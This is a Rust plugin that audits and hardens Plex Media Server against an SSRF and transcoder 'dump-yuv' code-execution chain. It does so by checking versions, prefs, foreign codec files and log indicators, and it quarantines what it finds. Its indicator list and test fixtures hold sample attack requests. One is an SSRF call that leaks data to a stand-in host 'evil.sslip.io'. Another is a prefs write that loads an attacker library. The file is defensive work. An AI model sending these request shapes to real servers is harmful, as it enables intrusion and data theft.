#![allow(clippy::disallowed_types)]

use plugin_toolkit::prelude::*;
use tokio::process::Command;

use crate::apt_repo::valid_target;
use crate::lifecycle::Runtime;
use crate::storage::{capture, guest};

pub const MIN_PATCHED_VERSION: &str = "1.42.2.10157";

const DEFAULT_DATA_DIR: &str =
    "/var/lib/plexmediaserver/Library/Application Support/Plex Media Server";

const REMOTE_PREFS: &[&str] = &[
    "PublishServerOnPlexOnlineKey",
    "ManualPortMappingMode",
    "ManualPortMappingPort",
];

const WAN_ONLY_IOCS: &[&str] = &["/player/proxy/poll", "/player/timeline/subscribe"];

const IOCS: &[&str] = &[
    "protocol=http%3A%2F%2F127.0.0.1",
    "protocol=http://127.0.0.1",
    "GetResultFromNetwork?url=",
    "/leak/",
    "plexscan-",
    "PUT /:/prefs?Transcoder",
    "resources/x?resource_name=",
];

#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "lowercase")]
pub enum Severity {
    Critical,
    Warning,
    Info,
    Unchecked,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct SecurityFinding {
    pub kind: String,
    pub severity: Severity,
    pub detail: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct LogIoc {
    pub indicator: String,
    pub timestamp: Option<String>,
    pub source_ip: Option<String>,
    pub wan: bool,
    pub line: String,
}

#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct PlexSecurityAuditReport {
    pub version: Option<String>,
    pub min_patched_version: String,
    pub clean: bool,
    pub findings: Vec<SecurityFinding>,
    pub remote_exposure: Vec<(String, String)>,
    pub foreign_codecs: Vec<String>,
    pub log_iocs: Vec<LogIoc>,
}

fn finding(kind: &str, severity: Severity, detail: impl Into<String>) -> SecurityFinding {
    SecurityFinding {
        kind: kind.to_string(),
        severity,
        detail: detail.into(),
    }
}

fn parse_version(v: &str) -> Vec<u64> {
    v.split('-')
        .next()
        .unwrap_or("")
        .split('.')
        .map(|p| p.parse().unwrap_or(0))
        .collect()
}

pub fn version_below(version: &str, minimum: &str) -> bool {
    parse_version(version) < parse_version(minimum)
}

pub fn suspicious_transcoder_prefs(prefs: &[(String, String)]) -> Vec<(String, String)> {
    prefs
        .iter()
        .filter(|(id, v)| {
            id.starts_with("Transcoder") && id.ends_with("Options") && !v.trim().is_empty()
        })
        .cloned()
        .collect()
}

pub fn is_shipped_codec(name: &str) -> bool {
    let Some(stem) = name.strip_prefix("lib").and_then(|n| {
        n.strip_suffix("_decoder.so")
            .or_else(|| n.strip_suffix("_encoder.so"))
    }) else {
        return false;
    };
    !stem.is_empty() && stem.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_')
}

pub fn foreign_codecs(paths: &[String]) -> Vec<String> {
    paths
        .iter()
        .filter(|p| {
            let mut parts = p.rsplit('/');
            let name = parts.next().unwrap_or("");
            let dir = parts.next().unwrap_or("");
            dir.contains("-linux-") && !is_shipped_codec(name)
        })
        .cloned()
        .collect()
}

pub fn scrub_tokens(line: &str) -> String {
    let scrubbed = plugin_toolkit::logging::scrub(line).into_owned();
    let lower = scrubbed.to_ascii_lowercase();
    let mut out = String::with_capacity(scrubbed.len());
    let mut i = 0;
    while let Some(off) = lower[i..].find("x-plex-token") {
        let key_end = i + off + "x-plex-token".len();
        let mut v = key_end;
        let bytes = scrubbed.as_bytes();
        while v < bytes.len() && matches!(bytes[v], b'=' | b':' | b' ' | b'"') {
            v += 1;
        }
        let mut end = v;
        while end < bytes.len() && !matches!(bytes[end], b'&' | b' ' | b'"' | b'\'' | b'#' | b']') {
            end += 1;
        }
        out.push_str(&scrubbed[i..v]);
        if end > v && &scrubbed[v..end] != "***" {
            out.push_str("***");
        } else {
            out.push_str(&scrubbed[v..end]);
        }
        i = end;
    }
    out.push_str(&scrubbed[i..]);
    out
}

fn is_private_ip(ip: &str) -> bool {
    match ip.parse::<std::net::IpAddr>() {
        Ok(std::net::IpAddr::V4(a)) => a.is_private() || a.is_loopback() || a.is_link_local(),
        Ok(std::net::IpAddr::V6(a)) => {
            a.is_loopback()
                || (a.segments()[0] & 0xfe00) == 0xfc00
                || (a.segments()[0] & 0xffc0) == 0xfe80
        }
        Err(_) => false,
    }
}

fn client_of(line: &str) -> (Option<String>, Option<bool>) {
    let Some(start) = line.find("Request: [") else {
        return (None, None);
    };
    let rest = &line[start + "Request: [".len()..];
    let Some(close) = rest.find(']') else {
        return (None, None);
    };
    let inner = &rest[..close];
    let (addr, tag) = match inner.split_once(" (") {
        Some((a, t)) => (a, Some(t.trim_end_matches(')'))),
        None => (inner, None),
    };
    let ip = addr
        .rsplit_once(':')
        .map(|(ip, _)| ip)
        .unwrap_or(addr)
        .trim_matches(['[', ']'])
        .to_string();
    let wan = match tag {
        Some(t) => Some(t.eq_ignore_ascii_case("WAN")),
        None => Some(!is_private_ip(&ip)),
    };
    (Some(ip), wan)
}

pub fn parse_ioc_line(line: &str) -> Option<LogIoc> {
    let (ip, wan) = client_of(line);
    let wan = wan.unwrap_or(false);
    let indicator = IOCS
        .iter()
        .find(|p| line.contains(*p))
        .or_else(|| WAN_ONLY_IOCS.iter().find(|p| wan && line.contains(*p)))?;
    let timestamp = line
        .split_once(" [")
        .map(|(t, _)| t.trim().to_string())
        .filter(|t| !t.is_empty());
    Some(LogIoc {
        indicator: indicator.to_string(),
        timestamp,
        source_ip: ip,
        wan,
        line: scrub_tokens(line.trim()),
    })
}

pub fn parse_iocs(out: &str) -> Vec<LogIoc> {
    out.lines().filter_map(parse_ioc_line).collect()
}

async fn capture_lenient(mut cmd: Command) -> Result<(bool, String)> {
    let out = cmd
        .output()
        .await
        .context("failed to spawn guest command")?;
    Ok((
        out.status.code().is_some_and(|c| c <= 1),
        String::from_utf8_lossy(&out.stdout).into_owned(),
    ))
}

async fn list_codec_files(runtime: Runtime, target: &str, data_dir: &str) -> Result<Vec<String>> {
    let mut cmd = guest(runtime, target);
    cmd.arg("find")
        .arg(format!("{data_dir}/Codecs"))
        .arg("-mindepth")
        .arg("2")
        .arg("-maxdepth")
        .arg("2")
        .arg("-path")
        .arg("*-linux-*/*")
        .arg("-type")
        .arg("f");
    let out = capture(cmd).await.context("list Codecs directory")?;
    Ok(out
        .lines()
        .map(str::trim)
        .filter(|l| !l.is_empty())
        .map(str::to_string)
        .collect())
}

async fn scan_logs(runtime: Runtime, target: &str, data_dir: &str) -> Result<(bool, String)> {
    let mut cmd = guest(runtime, target);
    cmd.arg("grep").arg("-h").arg("-s").arg("-F");
    for p in IOCS.iter().chain(WAN_ONLY_IOCS) {
        cmd.arg("-e").arg(p);
    }
    cmd.arg("--")
        .arg(format!("{data_dir}/Logs/Plex Media Server.log"));
    for n in 1..=5 {
        cmd.arg(format!("{data_dir}/Logs/Plex Media Server.{n}.log"));
    }
    capture_lenient(cmd).await
}

#[derive(clap::Args, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
pub struct PlexSecurityAuditArgs {
    /// Registered Plex endpoint to query over HTTP.
    pub endpoint: String,
    /// Where the instance runs: `lxc` or `docker`.
    #[arg(long, value_enum, default_value_t = Runtime::Lxc)]
    #[serde(default)]
    pub runtime: Runtime,
    /// LXC vmid or docker container name/id; without it Codecs and log checks are unchecked.
    #[arg(long)]
    #[serde(default)]
    pub target: Option<String>,
    /// Plex data directory inside the guest.
    #[arg(long, default_value_t = default_data_dir())]
    #[serde(default = "default_data_dir")]
    pub data_dir: String,
}

fn default_data_dir() -> String {
    DEFAULT_DATA_DIR.to_string()
}

fn checked_target(runtime: Runtime, target: Option<&str>) -> Result<Option<&str>> {
    match target {
        Some(t) if !valid_target(runtime, t) => bail!("invalid target {t:?}"),
        other => Ok(other),
    }
}

async fn audit(args: &PlexSecurityAuditArgs) -> Result<PlexSecurityAuditReport> {
    let client = crate::tools::make_client(&args.endpoint)?;
    let target = checked_target(args.runtime, args.target.as_deref())?;
    let mut findings = Vec::new();

    let version = client.identity_version().await.context("read /identity")?;
    match version.as_deref() {
        Some(v) if version_below(v, MIN_PATCHED_VERSION) => findings.push(finding(
            "version_unpatched",
            Severity::Critical,
            format!("server {v} is below minimum patched {MIN_PATCHED_VERSION}"),
        )),
        Some(v) => findings.push(finding("version", Severity::Info, format!("server {v}"))),
        None => findings.push(finding(
            "version",
            Severity::Unchecked,
            "server did not report a version",
        )),
    }

    let prefs = client.prefs().await.context("read /:/prefs")?;
    for (id, value) in suspicious_transcoder_prefs(&prefs) {
        findings.push(finding(
            "transcoder_options_set",
            Severity::Critical,
            format!("{id} = {}", scrub_tokens(&value)),
        ));
    }
    let remote_exposure: Vec<(String, String)> = prefs
        .iter()
        .filter(|(id, _)| REMOTE_PREFS.contains(&id.as_str()))
        .cloned()
        .collect();
    if remote_exposure
        .iter()
        .any(|(id, v)| id == "PublishServerOnPlexOnlineKey" && matches!(v.as_str(), "1" | "true"))
    {
        findings.push(finding(
            "remote_access_enabled",
            Severity::Warning,
            "server is published for remote access",
        ));
    }

    let mut foreign = Vec::new();
    let mut log_iocs = Vec::new();
    match target {
        None => {
            findings.push(finding("codecs", Severity::Unchecked, "no target given"));
            findings.push(finding("logs", Severity::Unchecked, "no target given"));
        }
        Some(t) => {
            match list_codec_files(args.runtime, t, &args.data_dir).await {
                Ok(files) => {
                    foreign = foreign_codecs(&files);
                    for f in &foreign {
                        findings.push(finding("foreign_codec", Severity::Critical, f.clone()));
                    }
                }
                Err(e) => findings.push(finding("codecs", Severity::Unchecked, format!("{e:#}"))),
            }
            match scan_logs(args.runtime, t, &args.data_dir).await {
                Ok((true, out)) => {
                    log_iocs = parse_iocs(&out);
                    if !log_iocs.is_empty() {
                        findings.push(finding(
                            "log_iocs",
                            Severity::Critical,
                            format!("{} exploit indicators in Plex logs", log_iocs.len()),
                        ));
                    }
                }
                Ok((false, _)) => findings.push(finding(
                    "logs",
                    Severity::Unchecked,
                    "Plex Media Server logs not readable",
                )),
                Err(e) => findings.push(finding("logs", Severity::Unchecked, format!("{e:#}"))),
            }
        }
    }

    let clean = !findings
        .iter()
        .any(|f| matches!(f.severity, Severity::Critical | Severity::Warning));
    Ok(PlexSecurityAuditReport {
        version,
        min_patched_version: MIN_PATCHED_VERSION.to_string(),
        clean,
        findings,
        remote_exposure,
        foreign_codecs: foreign,
        log_iocs,
    })
}

/// **Audit a Plex server** for the companion-proxy SSRF / transcoder `dump-yuv`
/// RCE chain: version, Transcoder*Options prefs, foreign Codecs libraries, log
/// indicators, and remote exposure. Read-only.
#[orca_tool(domain = "plex", verb = "security_audit", role = "admin")]
async fn plex_security_audit(
    args: PlexSecurityAuditArgs,
    _ctx: &ToolCtx,
) -> Result<PlexSecurityAuditReport> {
    audit(&args).await
}

#[derive(clap::Args, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
pub struct PlexSecurityHardenArgs {
    /// Registered Plex endpoint to query over HTTP.
    pub endpoint: String,
    /// Where the instance runs: `lxc` or `docker`.
    #[arg(long, value_enum, default_value_t = Runtime::Lxc)]
    #[serde(default)]
    pub runtime: Runtime,
    /// LXC vmid or docker container name/id; required to quarantine Codecs files.
    #[arg(long)]
    #[serde(default)]
    pub target: Option<String>,
    /// Plex data directory inside the guest.
    #[arg(long, default_value_t = default_data_dir())]
    #[serde(default = "default_data_dir")]
    pub data_dir: String,
    /// Also set PublishServerOnPlexOnlineKey=0.
    #[arg(long)]
    #[serde(default)]
    pub disable_remote: bool,
}

#[derive(Debug, Serialize, Deserialize, JsonSchema)]
#[schemars(crate = "plugin_toolkit::schemars")]
#[serde(rename_all = "camelCase")]
pub struct PlexSecurityHardenOutput {
    pub dry_run: bool,
    pub cleared_prefs: Vec<String>,
    pub quarantined: Vec<(String, String)>,
    pub remote_disabled: bool,
}

pub fn quarantine_path(quarantine_dir: &str, file: &str, stamp: &str) -> String {
    let mut parts = file.rsplit('/');
    let name = parts.next().unwrap_or("");
    let dir = parts.next().unwrap_or("");
    format!("{quarantine_dir}/{dir}__{name}.{stamp}")
}

/// **Harden a Plex server** against the companion-proxy SSRF / transcoder
/// `dump-yuv` RCE chain: clears non-empty Transcoder*Options prefs, moves
/// foreign Codecs files to a quarantine dir, optionally disables remote
/// publishing. `dryRun` reports the plan without changing anything.
#[orca_tool(
    domain = "plex",
    verb = "security_harden",
    role = "admin",
    execute_gated = false,
    dry_run_aware = true
)]
async fn plex_security_harden(
    args: PlexSecurityHardenArgs,
    ctx: &ToolCtx,
) -> Result<PlexSecurityHardenOutput> {
    let dry_run = ctx.dry_run();
    let client = crate::tools::make_client(&args.endpoint)?;
    let target = checked_target(args.runtime, args.target.as_deref())?;

    let prefs = client.prefs().await.context("read /:/prefs")?;
    let cleared_prefs: Vec<String> = suspicious_transcoder_prefs(&prefs)
        .into_iter()
        .map(|(id, _)| id)
        .collect();

    let mut quarantined = Vec::new();
    if let Some(t) = target {
        let files = list_codec_files(args.runtime, t, &args.data_dir).await?;
        let qdir = format!("{}/Codecs.quarantine", args.data_dir);
        let stamp = plugin_toolkit::time::Timestamp::now().compact();
        quarantined = foreign_codecs(&files)
            .into_iter()
            .map(|f| {
                let dest = quarantine_path(&qdir, &f, &stamp);
                (f, dest)
            })
            .collect();
        if !dry_run && !quarantined.is_empty() {
            let mut mk = guest(args.runtime, t);
            mk.arg("mkdir").arg("-p").arg(&qdir);
            capture(mk).await.context("create quarantine dir")?;
            for (src, dest) in &quarantined {
                let mut mv = guest(args.runtime, t);
                mv.arg("mv").arg("-n").arg("--").arg(src).arg(dest);
                capture(mv)
                    .await
                    .with_context(|| format!("quarantine {src}"))?;
            }
        }
    }

    if !dry_run {
        for id in &cleared_prefs {
            client
                .set_pref(id, "")
                .await
                .with_context(|| format!("clear {id}"))?;
        }
        if args.disable_remote {
            client
                .set_pref("PublishServerOnPlexOnlineKey", "0")
                .await
                .context("disable remote publishing")?;
        }
    }

    Ok(PlexSecurityHardenOutput {
        dry_run,
        cleared_prefs,
        quarantined,
        remote_disabled: args.disable_remote,
    })
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kv(v: &[(&str, &str)]) -> Vec<(String, String)> {
        v.iter()
            .map(|(a, b)| (a.to_string(), b.to_string()))
            .collect()
    }

    #[test]
    fn version_threshold() {
        assert!(version_below("1.42.2.10156-f737b826c", MIN_PATCHED_VERSION));
        assert!(version_below("1.41.9.9999", MIN_PATCHED_VERSION));
        assert!(!version_below("1.42.2.10157-abc", MIN_PATCHED_VERSION));
        assert!(!version_below("1.43.0.1", MIN_PATCHED_VERSION));
    }

    #[test]
    fn detects_non_empty_transcoder_options() {
        let prefs = kv(&[
            (
                "TranscoderH264Options",
                "dump-yuv=/x/Codecs/a-linux-x86_64/zz1.so:qp=0",
            ),
            ("TranscoderH264BackgroundPreset", "veryfast"),
            ("TranscoderHevcOptions", "  "),
            ("FriendlyName", "media"),
        ]);
        let hits = suspicious_transcoder_prefs(&prefs);
        assert_eq!(hits.len(), 1);
        assert_eq!(hits[0].0, "TranscoderH264Options");
    }

    #[test]
    fn classifies_codec_filenames() {
        assert!(is_shipped_codec("libh264_decoder.so"));
        assert!(is_shipped_codec("libaac_encoder.so"));
        assert!(is_shipped_codec("libhevc_mediacodec_decoder.so"));
        assert!(!is_shipped_codec("zz3.so"));
        assert!(!is_shipped_codec("lib_decoder.so"));
        assert!(!is_shipped_codec("libh264_decoder.so.bak"));
        assert!(!is_shipped_codec("libx-y_decoder.so"));
    }

    #[test]
    fn foreign_codecs_only_in_linux_dirs() {
        let paths: Vec<String> = [
            "/d/Codecs/abc-linux-x86_64/libh264_decoder.so",
            "/d/Codecs/abc-linux-x86_64/zz7.so",
            "/d/Codecs/other/zz8.so",
        ]
        .iter()
        .map(|s| s.to_string())
        .collect();
        assert_eq!(
            foreign_codecs(&paths),
            vec!["/d/Codecs/abc-linux-x86_64/zz7.so"]
        );
    }

    #[test]
    fn quarantine_path_keeps_origin_dir() {
        assert_eq!(
            quarantine_path(
                "/d/Codecs.quarantine",
                "/d/Codecs/abc-linux-x86_64/zz7.so",
                "20261024-000000"
            ),
            "/d/Codecs.quarantine/abc-linux-x86_64__zz7.so.20261024-000000"
        );
    }

    #[test]
    fn scrubs_plex_tokens() {
        let s = scrub_tokens("GET /x?a=1&X-Plex-Token=SECRETTOKEN123&b=2");
        assert!(!s.contains("SECRETTOKEN123"));
        assert!(s.contains("&b=2"));
        let h = scrub_tokens("x-plex-token: ABCDEF0123 trailing");
        assert!(!h.contains("ABCDEF0123"));
        assert!(h.contains("trailing"));
    }

    const POLL: &str = "Oct 24, 2026 03:12:01.123 [140001] DEBUG - Request: [203.0.113.7:51514 (WAN)] GET /player/proxy/poll?deviceName=plexscan-deadbeef-1 (8 live) #1a2b Signed-in";
    const SUBSCRIBE: &str = "Oct 24, 2026 03:12:02.456 [140002] DEBUG - Request: [203.0.113.7:51515 (WAN)] GET /player/timeline/subscribe?commandID=1&protocol=http://127.0.0.1:32400/system/agents/z/searchOne?identifier=com.plexapp.agents.thetvdb/function/GetResultFromNetwork?url=http://evil.sslip.io:8080/leak/42#";
    const PREFS: &str = "Oct 24, 2026 03:13:00.000 [140003] DEBUG - Request: [203.0.113.7:51516 (WAN)] PUT /:/prefs?TranscoderH264Options=dump-yuv=/x/zz1.so:qp=0&X-Plex-Token=FAKETOKEN999";
    const LAN_POLL: &str = "Oct 24, 2026 03:14:00.000 [140004] DEBUG - Request: [10.0.0.5:40000 (Subnet)] GET /player/proxy/poll?deviceName=iPhone";

    #[test]
    fn parses_wan_poll() {
        let ioc = parse_ioc_line(POLL).unwrap();
        assert_eq!(ioc.indicator, "plexscan-");
        assert_eq!(ioc.source_ip.as_deref(), Some("203.0.113.7"));
        assert_eq!(ioc.timestamp.as_deref(), Some("Oct 24, 2026 03:12:01.123"));
        assert!(ioc.wan);
    }

    #[test]
    fn parses_loopback_protocol_subscribe() {
        let ioc = parse_ioc_line(SUBSCRIBE).unwrap();
        assert_eq!(ioc.indicator, "protocol=http://127.0.0.1");
    }

    #[test]
    fn parses_prefs_and_scrubs_token() {
        let ioc = parse_ioc_line(PREFS).unwrap();
        assert_eq!(ioc.indicator, "PUT /:/prefs?Transcoder");
        assert!(!ioc.line.contains("FAKETOKEN999"));
    }

    #[test]
    fn ignores_lan_companion_poll() {
        assert!(parse_ioc_line(LAN_POLL).is_none());
        let iocs = parse_iocs(&[POLL, LAN_POLL, SUBSCRIBE, PREFS].join("\n"));
        assert_eq!(iocs.len(), 3);
    }

    #[test]
    fn untagged_public_ip_counts_as_wan() {
        let line = "Oct 24, 2026 03:15:00.000 [1] DEBUG - Request: [198.51.100.9:1234] GET /player/proxy/poll";
        let ioc = parse_ioc_line(line).unwrap();
        assert_eq!(ioc.indicator, "/player/proxy/poll");
        assert!(ioc.wan);
    }
}
